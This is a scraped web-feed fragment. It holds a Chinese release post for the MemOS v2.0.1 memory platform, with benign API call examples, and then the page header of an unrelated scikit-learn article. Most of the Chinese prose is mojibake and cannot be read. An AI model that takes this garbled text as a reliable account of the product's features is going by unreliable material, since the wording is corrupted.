a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e23e08d2fa984ce99e12c81b8c6f7e5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768997264&amp;x-signature=RVvX82q7XnMLM2jeOgBW1FsHyzg%3D" alt="logoåŠ¨æ€.jpg" loading="lazy"/></p>
<p>åœ¨è¿‡å»çš„ç‰ˆæœ¬ä¸­ï¼ŒMemOS å·²ç»å¸®åŠ©å¼€å‘è€…è§£å†³äº†å¤§æ¨¡å‹çš„é•¿æœŸè®°å¿†ç®¡ç†é—®é¢˜ã€‚</p>
<p>v2.0.1 ç‰ˆæœ¬é‡Œï¼Œæˆ‘ä»¬èšç„¦å¼€å‘è€…å®é™…åº”ç”¨åœºæ™¯ï¼Œé’ˆå¯¹äº”é¡¹æ ¸å¿ƒåŠŸèƒ½å®Œæˆå‡çº§ï¼Œè¿›ä¸€æ­¥è¡¥å…¨äº† MemOS åœ¨è·¨ä¼šè¯åœºæ™¯ä¸‹çš„è®°å¿†ç®¡ç†èƒ½åŠ›å’Œå¯¹è¯èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-0">æ ¸å¿ƒåŠŸèƒ½äº®ç‚¹</h3>
<ol>
<li>æ”¯æŒå…¨é‡è·å–ç”¨æˆ·è®°å¿†ï¼›</li>
<li>å¯¹è¯åŠŸèƒ½å®ç°â€œè®°å¿†æŒä¹…â€ï¼›</li>
<li>Playground æ”¯æŒæ‰‹åŠ¨åˆ é™¤è¿‡æœŸè®°å¿†ï¼›</li>
<li>åˆ é™¤è®°å¿†æ¥å£ä¼˜åŒ–ä¸åé¦ˆæœºåˆ¶å‡çº§ï¼Œæé«˜å¼€å‘è€…åˆ†æä¸æ§åˆ¶èƒ½åŠ›ï¼›</li>
<li>Search æ¥å£å»é‡åŠŸèƒ½ã€‚</li>
</ol>
<h3 data-id="heading-1">æœ¬æ¬¡å‘å¸ƒæ±‡æ€»</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0653da7eaafb4a7bb7ca8afd2348521c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768997264&amp;x-signature=y3rSlxUin%2BZh4sIa8pNYTLPjDy8%3D" alt="1.png" loading="lazy"/></p>
<h2 data-id="heading-2">ä¸€ã€å…¨é‡è·å–è®°å¿†ï¼šå¼€å‘è€…çš„â€œç”¨æˆ·è®°å¿†å¿«ç…§â€</h2>
<p>åœ¨ä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œè·å–è®°å¿†é€šå¸¸éœ€è¦åˆ†æ‰¹æˆ–æŒ‡å®š query æ‰èƒ½è¿”å›ç»“æœï¼Œæ— æ³•å¿«é€Ÿå…¨é‡æµè§ˆæŸä¸ªç”¨æˆ·çš„å†å²ä¿¡æ¯ã€‚</p>
<p>æœ¬æ¬¡æ›´æ–°ï¼Œæˆ‘ä»¬å‘å¸ƒäº† get/memory æ¥å£ï¼Œæ”¯æŒå¼€å‘è€…æŒ‰æ—¶é—´å€’åºåˆ†é¡µè·å–ç”¨æˆ·çš„æ‰€æœ‰äº‹å®è®°å¿†å’Œåå¥½è®°å¿†ã€‚æ— éœ€æä¾› queryï¼Œå¼€å‘è€…å¯ä»¥ä¸€é”®åœ¨åº”ç”¨å‰å°å±•ç¤ºç”¨æˆ·æ‰€æœ‰è®°å¿†ã€‚</p>
<p><strong>åŠŸèƒ½æ¦‚è¿°ï¼š</strong>
get/memory æ¥å£æ”¯æŒè·å–ç”¨æˆ·æ‰€æœ‰è®°å¿†ï¼ŒåŒ…æ‹¬äº‹å®è®°å¿†ä¸åå¥½è®°å¿†ã€‚</p>
<p><strong>äº‘æœåŠ¡ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

<span class="hljs-comment"># æ›¿æ¢æˆä½ çš„ API Key</span>
os.environ[<span class="hljs-string">"MEMOS_API_KEY"</span>] = <span class="hljs-string">"YOUR_API_KEY"</span>
os.environ[<span class="hljs-string">"MEMOS_BASE_URL"</span>] = <span class="hljs-string">"https://memos.memtensor.cn/api/openmem/v1"</span>

data = {
    <span class="hljs-string">"user_id"</span>: <span class="hljs-string">"memos_user_123"</span>,
    <span class="hljs-string">"page"</span>: <span class="hljs-number">2</span>, <span class="hljs-comment"># å¯é€‰ï¼Œé»˜è®¤å€¼ä¸º1</span>
    <span class="hljs-string">"size"</span>: <span class="hljs-number">3</span>, <span class="hljs-comment"># å¯é€‰ï¼Œé»˜è®¤å€¼ä¸º10</span>
    <span class="hljs-string">"include_preference"</span>: <span class="hljs-string">"true"</span><span class="hljs-comment"># å¯é€‰ï¼Œé»˜è®¤å€¼ä¸ºtrue</span>
  }
headers = {
<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>,
<span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Token <span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_API_KEY'</span>]}</span>"</span>
}
url = <span class="hljs-string">f"<span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_BASE_URL'</span>]}</span>/get/memory"</span>

res = requests.post(url=url, headers=headers, data=json.dumps(data))

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"result: <span class="hljs-subst">{res.json()}</span>"</span>)
</code></pre>
<p><strong>å¼€æºç‰ˆæœ¬ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-css" lang="css">curl <span class="hljs-attr">--location</span> <span class="hljs-attr">--request</span> POST 'http://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8001</span>/product/get_memory<span class="hljs-string">' \
--header '</span>Content-Type: application/json<span class="hljs-string">' \
--data-raw '</span>{
    "user_id": <span class="hljs-string">"test_1"</span>,
    <span class="hljs-string">"mem_cube_id"</span>: <span class="hljs-string">"test_1"</span>,
    <span class="hljs-string">"include_preference"</span>: <span class="hljs-string">"true"</span>,
    <span class="hljs-string">"page"</span>:<span class="hljs-number">2</span>,
    <span class="hljs-string">"page_size"</span>:<span class="hljs-number">3</span>
}'
</code></pre>
<h2 data-id="heading-3">äºŒã€äº‘æœåŠ¡ Chat æ¥å£å‘å¸ƒï¼šå¯¹è¯åŠŸèƒ½å®ç°â€œè®°å¿†æŒä¹…â€</h2>
<p>æ­¤æ¬¡æ›´æ–°çš„ chat æ¥å£å°†å†å²è®°å¿†è‡ªåŠ¨çº³å…¥å¯¹è¯ç”Ÿæˆæµç¨‹ï¼Œç³»ç»Ÿä¼šå…ˆæ£€ç´¢ä¸å½“å‰ query ç›¸å…³çš„è®°å¿†ï¼Œå†ç»“åˆä¼šè¯ä¸Šä¸‹æ–‡ç”Ÿæˆå›ç­”ï¼Œå¹¶å°†å¯¹è¯ç»“æœè¿”å›å¼€å‘è€…ã€‚</p>
<p>æ— éœ€æ‰‹åŠ¨ç»´æŠ¤ä¸Šä¸‹æ–‡ï¼Œå³å¯æ„å»ºå¤šè½®ã€è®°å¿†é©±åŠ¨çš„å¯¹è¯ä½“éªŒï¼Œè®© AI åº”ç”¨æ›´åŠ è‡ªç„¶ã€è¿ç»­ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7325fb5849041548940b8ecda35488c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768997264&amp;x-signature=aAFXnKEABiEn2TISQlP8pelZbnw%3D" alt="2.png" loading="lazy"/></p>
<p>äº¤äº’æµç¨‹ï¼š</p>
<ol>
<li>å¦‚æœå­˜åœ¨ç”¨æˆ·å†å²æ¶ˆæ¯ï¼Œå¯å…ˆè°ƒç”¨ <code>add/message</code> å†™å…¥ MemOSã€‚</li>
<li>ç”¨æˆ·å‘é€æ¶ˆæ¯æ—¶ï¼ŒAI åº”ç”¨è°ƒç”¨ chat æ¥å£ã€‚</li>
<li>MemOS å¤„ç†æµç¨‹ï¼š
<ul>
<li>å¬å›ç”¨æˆ·ç›¸å…³å†å²è®°å¿†</li>
<li>æ‹¼æ¥è‡ªå®šä¹‰æŒ‡ä»¤ã€å½“å‰ä¼šè¯ä¸Šä¸‹æ–‡ä¸å¬å›çš„è®°å¿†ç”Ÿæˆå®Œæ•´ Prompt</li>
<li>è°ƒç”¨å¤§æ¨¡å‹ç”Ÿæˆå›ç­”</li>
</ul>
</li>
<li>AI åº”ç”¨è¿”å›ç»“æœç»™ç»ˆç«¯ç”¨æˆ·ã€‚</li>
</ol>
<p>åŠŸèƒ½æ¦‚è¿°ï¼š
chat æ¥å£ä¸Šçº¿ï¼Œå®ç°ä¸ç”¨æˆ·çš„â€œè®°å¿†æŒä¹…å¯¹è¯â€ï¼Œç³»ç»Ÿè‡ªåŠ¨å¬å›ç›¸å…³å†å²è®°å¿†å¹¶ç”Ÿæˆå›ç­”ã€‚</p>
<p>è°ƒç”¨ç¤ºä¾‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

<span class="hljs-comment"># æ›¿æ¢æˆä½ çš„ API Key</span>
os.environ[<span class="hljs-string">"MEMOS_API_KEY"</span>] = <span class="hljs-string">"YOUR_API_KEY"</span>
os.environ[<span class="hljs-string">"MEMOS_BASE_URL"</span>] = <span class="hljs-string">"https://memos.memtensor.cn/api/openmem/v1"</span>

data = {
<span class="hljs-string">"user_id"</span>: <span class="hljs-string">"memos_user_123"</span>,
<span class="hljs-string">"conversation_id"</span>: <span class="hljs-string">"memos_chat_conv"</span>,
<span class="hljs-string">"query"</span>: <span class="hljs-string">"ä½ å¥½ï¼Œç»™æˆ‘æ¨èç¾é£Ÿã€‚"</span>
}
headers = {
<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>,
<span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Token <span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_API_KEY'</span>]}</span>"</span>
}
url = <span class="hljs-string">f"<span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_BASE_URL'</span>]}</span>/chat"</span>

res = requests.post(url=url, headers=headers, data=json.dumps(data))

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"result: <span class="hljs-subst">{res.json()}</span>"</span>)
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€åˆ é™¤è®°å¿†ä¼˜åŒ–ä¸åé¦ˆæœºåˆ¶å‡çº§</h2>
<p>ä¸ºäº†æé«˜æ¥å£è°ƒç”¨æ•ˆç‡å’Œåå¥½è®°å¿†çš„è°ƒæ•´èƒ½åŠ›ï¼Œæœ¬æ¬¡æ›´æ–°å¯¹ delete/memory å’Œ feedback æ¥å£è¿›è¡Œäº†ä¼˜åŒ–ï¼š</p>
<ul>
<li>delete/memory æ¥å£ä¼˜åŒ–ï¼Œå¯åˆ é™¤æ‰€æœ‰ç±»å‹è®°å¿†ï¼Œæ— éœ€æŒ‡å®šç”¨æˆ·ã€‚</li>
<li>feedback æ¥å£æ”¯æŒåå¥½è®°å¿†æ›´æ–°ï¼Œç”¨æˆ·åé¦ˆå¯ç›´æ¥ä¿®æ”¹åå¥½è®°å¿†ã€‚</li>
</ul>
<p>å¼€å‘è€…ç°åœ¨å¯ä»¥åœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ï¼Œæ›´é«˜æ•ˆåœ°ç®¡ç†è®°å¿†ï¼Œå¹¶åœ¨åˆ†æå’Œè°ƒè¯•ä¸­è·å¾—æ›´æ¸…æ™°çš„æ•°æ®è¡¨ç°ã€‚</p>
<h3 data-id="heading-5">3.1 åˆ é™¤è®°å¿†</h3>
<p>åŠŸèƒ½æ¦‚è¿°ï¼š
delete/memory æ¥å£ä¼˜åŒ–ï¼Œæ— éœ€æŒ‡å®šç”¨æˆ·ï¼Œæ”¯æŒåˆ é™¤æ‰€æœ‰ç±»å‹è®°å¿†ï¼ˆç”¨æˆ·è®°å¿†ã€çŸ¥è¯†åº“è®°å¿†ç­‰ï¼‰ã€‚</p>
<p>äº‘æœåŠ¡ç¤ºä¾‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

<span class="hljs-comment"># æ›¿æ¢æˆä½ çš„ API Key</span>
os.environ[<span class="hljs-string">"MEMOS_API_KEY"</span>] = <span class="hljs-string">"YOUR_API_KEY"</span>
os.environ[<span class="hljs-string">"MEMOS_BASE_URL"</span>] = <span class="hljs-string">"https://memos.memtensor.cn/api/openmem/v1"</span>

data = {
<span class="hljs-string">"memory_ids"</span>: [<span class="hljs-string">"6b23b583-f4c4-4a8f-b345-58d0c48fea04"</span>] <span class="hljs-comment"># æ›¿æ¢ä¸ºçœŸå®çš„è®°å¿† ID</span>
}
headers = {
<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>,
<span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Token <span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_API_KEY'</span>]}</span>"</span>
}
url = <span class="hljs-string">f"<span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_BASE_URL'</span>]}</span>/delete/memory"</span>

res = requests.post(url=url, headers=headers, data=json.dumps(data))

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"result: <span class="hljs-subst">{res.json()}</span>"</span>)
</code></pre>
<h3 data-id="heading-6">3.2 åé¦ˆä¿®æ­£ï¼ˆadd_feedbackï¼‰</h3>
<p>åŠŸèƒ½æ¦‚è¿°ï¼š
feedback æ¥å£æ”¯æŒåå¥½è®°å¿†ä¿®æ­£ï¼Œç³»ç»Ÿä¼šæ ¹æ®ç”¨æˆ·åé¦ˆæ–‡æœ¬åŒæ­¥æ›´æ–°åå¥½è®°å¿†ï¼Œæ— éœ€é¢å¤–å‚æ•°ã€‚</p>
<p>äº‘æœåŠ¡ç¤ºä¾‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

<span class="hljs-comment"># æ›¿æ¢æˆä½ çš„ MemOS API Key</span>
os.environ[<span class="hljs-string">"MEMOS_API_KEY"</span>] = <span class="hljs-string">"YOUR_API_KEY"</span>
os.environ[<span class="hljs-string">"MEMOS_BASE_URL"</span>] = <span class="hljs-string">"https://memos.memtensor.cn/api/openmem/v1"</span>

data = {
    <span class="hljs-string">"user_id"</span>: <span class="hljs-string">"memos_user_123"</span>,
    <span class="hljs-string">"conversation_id"</span>: <span class="hljs-string">"0108"</span>,
    <span class="hljs-string">"feedback_content"</span>: <span class="hljs-string">"é”™å•¦ï¼Œå®é™…ä¸Šæˆ‘å–œæ¬¢çš„æ˜¯å±±ç«¹"</span>,
    <span class="hljs-string">"feedback_time"</span>: <span class="hljs-string">"2025-12-02 10:10:10"</span>,
    <span class="hljs-string">"allow_knowledgebase_ids"</span>: [
        <span class="hljs-string">"basebXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"</span>
    ] 
  }
headers = {
<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>,
<span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Token <span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_API_KEY'</span>]}</span>"</span>
}
url = <span class="hljs-string">f"<span class="hljs-subst">{os.environ[<span class="hljs-string">'MEMOS_BASE_URL'</span>]}</span>/add/feedback"</span>

res = requests.post(url=url, headers=headers, data=json.dumps(data))

<span class="hljs-built_in">print</span>(json.dumps(res.json(), indent=<span class="hljs-number">2</span>, ensure_ascii=<span class="hljs-literal">False</span>))
</code></pre>
<p>å¼€æºé¡¹ç›®ç¤ºä¾‹</p>
<pre><code class="hljs language-css" lang="css">curl <span class="hljs-attr">--location</span> <span class="hljs-attr">--request</span> POST 'http://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8001</span>/product/feedback<span class="hljs-string">' \
--header '</span>Content-Type: application/json<span class="hljs-string">' \
--data-raw '</span>{
  "user_id": <span class="hljs-string">"memos_user_123"</span>,
  <span class="hljs-string">"writable_cube_ids"</span>: [
    <span class="hljs-string">"demo_cube_001"</span>
  ],
  <span class="hljs-string">"history"</span>: [
            {"role": <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æˆ‘å–œæ¬¢ä»€ä¹ˆæ°´æœï¼Œä¸å–œæ¬¢ä»€ä¹ˆæ°´æœ"</span>},
            {"role": <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ å–œæ¬¢è‹¹æœï¼Œä¸å–œæ¬¢é¦™è•‰"</span>}
  ],
  "feedback_content": <span class="hljs-string">"é”™äº†ï¼Œå®é™…ä¸Šæˆ‘å–œæ¬¢çš„æ˜¯å±±ç«¹"</span>
}'
</code></pre>
<h2 data-id="heading-7">å››ã€Playground è®°å¿†ç®¡ç†é¡µï¼šå¯è§†åŒ–æ§åˆ¶</h2>
<p>åœ¨ä¹‹å‰ç‰ˆæœ¬ä¸­ï¼ŒPlayground çš„åˆ é™¤æ“ä½œä»éœ€è°ƒç”¨æ¥å£ã€‚</p>
<p>v2.0.1 åœ¨ Playground ä¸­æ–°å¢äº† æ‰‹åŠ¨åˆ é™¤è¿‡æœŸè®°å¿†åŠŸèƒ½ï¼Œç”¨æˆ·å¯ç›´æ¥åœ¨é¡µé¢ä¸­ç®¡ç†ä¸å†éœ€è¦çš„è®°å¿†ï¼Œå®ç°å¿«é€Ÿè°ƒè¯•æˆ–æ¼”ç¤ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0178fb1a4f654e5898313074b2b59afd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768997264&amp;x-signature=7V3Ciy6ZwszrxW5TOPAt%2FDqVMx4%3D" alt="3.png" loading="lazy"/></p>
<p>ç°åœ¨ï¼Œå¼€å‘è€…èƒ½å¤Ÿæ›´ç›´è§‚åœ°æ“ä½œå’ŒéªŒè¯è®°å¿†è¡Œä¸ºï¼Œè¿›ä¸€æ­¥å‡å°‘äº†é‡å¤è°ƒç”¨æ¥å£çš„æ“ä½œæˆæœ¬ã€‚</p>
<h2 data-id="heading-8">äº”ã€Search æ¥å£å»é‡ï¼šç»“æœæ›´ç²¾å‡†</h2>
<p>v2.0.1 å¯¹ search æ¥å£æ–°å¢äº† dedup å‚æ•°ï¼Œæ”¯æŒè¯­ä¹‰å»é‡ï¼Œå‡å°‘é‡å¤æ£€ç´¢ç»“æœã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c425d8ce715142c1b5aebc232461390f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768997264&amp;x-signature=Qazw0wjhuiaH7I5PTiQ2rAMvnZE%3D" alt="4.png" loading="lazy"/></p>
<p>ç°åœ¨å¯ä»¥ç›´æ¥é€šè¿‡æ¥å£æ§åˆ¶æ£€ç´¢ç»“æœçš„é‡å¤ç­–ç•¥ï¼Œé¿å…äº†å¯èƒ½å‡ºç°åŒä¸€äº‹å®çš„å¤šç§è¡¨è¿°é‡å¤è¿”å›ï¼ŒåŠåœ¨ç»Ÿè®¡æˆ–å±•ç¤ºæ—¶éœ€è¦é¢å¤–å¤„ç†é‡å¤æ•°æ®çš„æƒ…å†µï¼Œè¿›ä¸€æ­¥æå‡æ£€ç´¢ç»“æœä¿¡æ¯é‡å’Œå¯ç”¨æ€§ã€‚</p>
<p>å¼€æºé¡¹ç›®ç¤ºä¾‹</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> json

<span class="hljs-keyword">import</span> requests

BASE_URL = <span class="hljs-string">"http://127.0.0.1:8001"</span>
headers = {<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>}

<span class="hljs-keyword">data</span> = {
<span class="hljs-string">"user_id"</span>: <span class="hljs-string">"memos_user_123"</span>,
<span class="hljs-string">"query"</span>: <span class="hljs-string">"æˆ‘å–œæ¬¢åƒä»€ä¹ˆï¼Ÿ"</span>,
<span class="hljs-string">"top_k"</span>: <span class="hljs-number">10</span>,
<span class="hljs-string">"dedup"</span>: <span class="hljs-string">"sim"</span>
}

res = requests.post(url=f<span class="hljs-string">"{BASE_URL}/product/search"</span>, headers=headers, <span class="hljs-keyword">data</span>=json.dumps(<span class="hljs-keyword">data</span>))
print(res.status_code, res.json())
</code></pre>
<h2 data-id="heading-9">å…­ã€å¼€æºç¤¾åŒºæ›´æ–°</h2>
<ul>
<li>get/memory æ”¯æŒå…¨é‡ä¸åˆ†é¡µæ£€ç´¢ï¼›</li>
<li>delete/memory ä¸ add/feedback å·¥å…·å¯åœ¨ MCP ä¸­è°ƒç”¨ï¼›</li>
<li>Search æ¥å£å¢åŠ  dedup å»é‡ç­–ç•¥ï¼›</li>
<li>ä¿®å¤è°ƒåº¦ local æ¨¡å¼ç¼ºå°‘ redis é…ç½®æŠ¥é”™ï¼›</li>
<li>ä¿®å¤ kv_cache æ–°ç‰ˆå…¼å®¹é—®é¢˜ï¼›</li>
<li>æ‰¹é‡ add æ€§èƒ½ä¼˜åŒ–ä¸æ›´ç²¾ç»†æ£€ç´¢èƒ½åŠ›ã€‚</li>
</ul>
<hr/>
<hr/>
<p>âœ¨ è€è§„çŸ©ï¼</p>
<p>ğŸš€ ä¸€é”®ä½“éªŒäº‘å¹³å°</p>
<p>ç«‹å³è¿›å…¥ MemOS äº‘å¹³å°ï¼Œä½“éªŒæ¯«ç§’çº§è®°å¿†ä¸åå¥½å¬å›èƒ½åŠ›ã€‚</p>
<p>memos-dashboard.openmem.net/quickstart/?entrance=wechat</p>
<p>ğŸ’¾ å¦‚æœä½ å–œæ¬¢æˆ‘ä»¬çš„å·¥ä½œï¼Œè¯·ä¸€é”®ä¸‰è¿ï¼š</p>
<p>â­ï¸ Starâ€ƒğŸ´ Forkâ€ƒğŸ‘€ Watch</p>
<p>å¹¶æ¬¢è¿é€šè¿‡ Issue æäº¤ä½ çš„ä½¿ç”¨åé¦ˆã€ä¼˜åŒ–å»ºè®®æˆ– Bug æŠ¥å‘Šã€‚</p>
<p>github.com/MemTensor/MemOS/issues</p>
<hr/>
<p>å…³äº MemOS</p>
<p>MemOS ä¸º AI åº”ç”¨æ„å»ºç»Ÿä¸€çš„è®°å¿†ç®¡ç†å¹³å°ï¼Œè®©æ™ºèƒ½ç³»ç»Ÿå¦‚å¤§è„‘èˆ¬æ‹¥æœ‰çµæ´»ã€å¯è¿ç§»ã€å¯å…±äº«çš„é•¿æœŸè®°å¿†å’Œå³æ—¶è®°å¿†ã€‚</p>
<p>ä½œä¸ºè®°å¿†å¼ é‡é¦–æ¬¡æå‡ºâ€œè®°å¿†è°ƒåº¦â€æ¶æ„çš„ AI è®°å¿†æ“ä½œç³»ç»Ÿï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ MemOS å…¨é¢é‡æ„æ¨¡å‹è®°å¿†èµ„æºçš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œä¸ºæ™ºèƒ½ç³»ç»Ÿæä¾›é«˜æ•ˆä¸”çµæ´»çš„è®°å¿†ç®¡ç†èƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Scikit-learn é›¶åŸºç¡€ï¼Œä»å®‰è£…åˆ°å®æˆ˜æœºå™¨å­¦ä¹ æ¨¡å‹]]></title>    <link>https://juejin.cn/post/7595021656428855323</link>    <guid>https://juejin.cn/post/7595021656428855323</guid>    <pubDate>2026-01-14T14:55:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656428855323" data-draft-id="7595067620949852186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Scikit-learn é›¶åŸºç¡€ï¼Œä»å®‰è£…åˆ°å®æˆ˜æœºå™¨å­¦ä¹ æ¨¡å‹"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-14T14:55:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰æœ¨å½¤"/> <meta itemprop="url" content="https://juejin.cn/user/696422157001465"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Scikit-learn é›¶åŸºç¡€ï¼Œä»å®‰è£…åˆ°å®æˆ˜æœºå™¨å­¦ä¹ æ¨¡å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/696422157001465/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰æœ¨å½¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:55:18.000Z" title="Wed Jan 14 2026 14:55:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
